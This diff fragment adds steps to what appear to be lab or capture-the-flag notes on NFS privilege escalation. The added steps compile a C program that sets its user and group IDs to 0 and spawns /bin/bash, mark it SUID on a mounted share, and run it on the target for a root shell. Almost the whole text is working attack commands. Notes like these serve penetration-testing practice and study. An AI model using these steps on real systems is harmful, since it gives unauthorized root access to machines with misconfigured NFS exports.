@@ -82,5 +82,18 @@ mount -o rw,vers=3 10.10.240.117:/tmp /tmp/1
 (c) Now create exploit in shared
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
 
+(d) compile it:
+gcc /tmp/1/x.c -o /tmp/1/x 
+
+(e) 
+chmod +s /tmp/1/x
+
+IN TARGET:
+(a)
+type:
+
+/tmp/x
+
+we will get root shell
 
 
